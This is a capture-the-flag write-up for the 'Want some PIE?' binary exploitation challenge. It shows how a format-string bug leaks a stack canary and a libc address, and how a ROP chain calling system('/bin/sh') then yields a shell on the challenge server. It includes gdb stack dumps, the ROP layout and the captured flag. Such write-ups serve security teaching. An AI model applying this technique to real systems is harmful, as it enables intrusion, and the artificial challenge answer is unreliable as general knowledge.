# Want some PIE? - Points: 200 - (Solves: 22)

**Category**: Binary Exploitation

**Description**: It seems the enemy has figured out how to turn on ASLR, but
they still don't know how to properly code. Compromise the server and steal the
flag. Listening on challenge.acictf.com:1752, binary: [registrar](registrar),
libc: [libc.so](libc.so)

**Hints**:
- Have you completed 'Say as I say, not as I do' yet? Solve that one first.
- Since ASLR is enabled, you'll need to find a way to leak some interesting
  details about where things are located in memory.
- Even with ASLR in place, libc is still a good source of ROP gadgets and
  utility functions.

## Solution

A quick look at the provided server binary in IDA shows that it is almost
identical to the one in `Say as i say, not as i do`. Checksec indicates that
PIE is enabled this time, and the hints state that ASLR is on.

```
$ checksec registrar
[*] '/home/user/ctf-writeups/2018-cyberstakes/want_some_pie/registrar'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

ASLR doesn't worry me much, as we already have a way to leak arbitrary memory
from the last problem, and we also have a way of looping the program so we can
trigger the vulnerability multiple times without the memory map changing.

However, I figured it would likely be easier to solve this problem with the
intended solution - use the format string to leak the stack canary, then smash
the stack and keep the cookie intact to trigger a short ROP chain.

During my testing, I set a breakpoint on call to printf triggering the format
string vulnerability. Sending any input, we can examine the stack for potential
pointers to interesting locations. Specifically, we're looking for the offset
to the stack cookie (to bypass stack protection) and the offset to any pointer
on that stack that points within libc (to bypass ASLR).

```
$ gdb registrar
Reading symbols from registrar...(no debugging symbols found)...done.
(gdb) start
Temporary breakpoint 1 at 0xc0d
Starting program: /home/user/ctf-writeups/2018-cyberstakes/want_some_pie/registrar

Temporary breakpoint 1, 0x000055987adedc0d in main ()
=> 0x000055987adedc0d <main+4>:	48 83 ec 70	sub    rsp,0x70
(gdb) info proc mapping
process 13875
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x55987aded000     0x55987adef000     0x2000        0x0 /home/user/ctf-writeups/2018-cyberstakes/want_some_pie/registrar
      0x55987afee000     0x55987afef000     0x1000     0x1000 /home/user/ctf-writeups/2018-cyberstakes/want_some_pie/registrar
      0x55987afef000     0x55987aff0000     0x1000     0x2000 /home/user/ctf-writeups/2018-cyberstakes/want_some_pie/registrar
      0x7f712d60a000     0x7f712d7ca000   0x1c0000        0x0 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7f712d7ca000     0x7f712d9ca000   0x200000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7f712d9ca000     0x7f712d9ce000     0x4000   0x1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7f712d9ce000     0x7f712d9d0000     0x2000   0x1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
      0x7f712d9d0000     0x7f712d9d4000     0x4000        0x0
      0x7f712d9d4000     0x7f712d9fa000    0x26000        0x0 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7f712dbd6000     0x7f712dbd9000     0x3000        0x0
      0x7f712dbf9000     0x7f712dbfa000     0x1000    0x25000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7f712dbfa000     0x7f712dbfb000     0x1000    0x26000 /lib/x86_64-linux-gnu/ld-2.23.so
      0x7f712dbfb000     0x7f712dbfc000     0x1000        0x0
      0x7ffd39ee1000     0x7ffd39f02000    0x21000        0x0 [stack]
      0x7ffd39f62000     0x7ffd39f65000     0x3000        0x0 [vvar]
      0x7ffd39f65000     0x7ffd39f67000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
(gdb) b *(0x55987aded000 + 0xd0b)
Breakpoint 2 at 0x55987adedd0b
(gdb) c
Continuing.
Please enter your register code name:
aaaa
Attempting to register code name:

Breakpoint 2, 0x000055987adedd0b in main ()
=> 0x000055987adedd0b <main+258>:	e8 60 fc ff ff	call   0x55987aded970 <printf@plt>
(gdb) x/20gx $rsp
0x7ffd39eff120:	0x00007ffd39eff278	0x000000012d61a410
0x7ffd39eff130:	0x00007ffd39eff240	0x00007f712d9ebeef
0x7ffd39eff140:	0x0000000a61616161	0x0000000000000000
0x7ffd39eff150:	0x0000000000000000	0x0000000000000000
0x7ffd39eff160:	0x0000000000000000	0x0000000000000000
0x7ffd39eff170:	0x0000000000000000	0x0000000000000000
0x7ffd39eff180:	0x00007ffd39eff270	0x4f5b98ec56995100
0x7ffd39eff190:	0x000055987adedd90	0x00007f712d62a830
0x7ffd39eff1a0:	0x0000000000000000	0x00007ffd39eff278
0x7ffd39eff1b0:	0x0000000100000000	0x000055987adedc09
```

Examining the stack dump above, we notice what looks like a canary at address
0x7ffd39eff188, and a pointer into libc at 0x7ffd39eff198. Since the first 6
arguments are passed in registers per the linux amd64 calling convention, the
format values at offset 0-5 are also in registers. Counting the pointers
starting at 6, the canary is the 19th argument to printf, and the libc pointer
is the 21st. We can leak these values by using the "%19$p" and "%21$p" format
specifiers. Since the libc pointer is the return address from `main` back into
`__libc_start_main`, we can lookup the offset of this return address in libc,
and compute libc base from there.

Since we've leaked both the stack cookie and a libc pointer, we can now send a
ROP chain that will call `system("/bin/sh")`. To do this, I dumped the ROP
gadgets from the given libc with ROPgadget, and found a gadget to move the
stack pointer to rdi. This will allow us to specify our first argument on th
stack before calling system.

Our ROP chain therefore looks as follows:

```
pop rax                     ; Move system() into rax
<system>
mov rdi, rsp ; call rax     ; Set rdi to "/bin/sh" and call system()
"/bin/sh"
```

We can then construct our payload for `gets()` in such a way that the stack
canary is preserved, but we still gain execution and spawn a shell. See this
short pwntools [script](solve.py) for a solution.

```
$ ./solve.py
[*] '/home/user/ctf-writeups/2018-cyberstakes/want_some_pie/libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to challenge.acictf.com on port 1752: Done
[*] Leaking stack cookie and libc base
[*] cookie     : 0x9bc0e31940e1b300
[*] libc base  : 0x7fb4fa281000
[*] libc system: 0x7fb4fa2c6390
[*] Sending ROP payload
[*] Switching to interactive mode

$ id
uid=1028(want-some-pie-_0) gid=1029(want-some-pie-_0) groups=1029(want-some-pie-_0)
$ ls -l
total 1852
-r--r----- 1 hacksports want-some-pie-_0      33 Nov 30 12:31 flag.txt
-rw-rw-r-- 1 hacksports hacksports       1868984 Nov 30 12:31 libc.so
-rwxr-sr-x 1 hacksports want-some-pie-_0   13528 Nov 30 12:31 registrar
-rwxr-sr-x 1 hacksports want-some-pie-_0     122 Nov 30 12:31 xinet_startup.sh
$ cat flag.txt
ACI{b33d86d499b53dcddf2948ff069}
```

I wish I had taken this route on the first problem, as it would have likely
worked without modification on both problems.
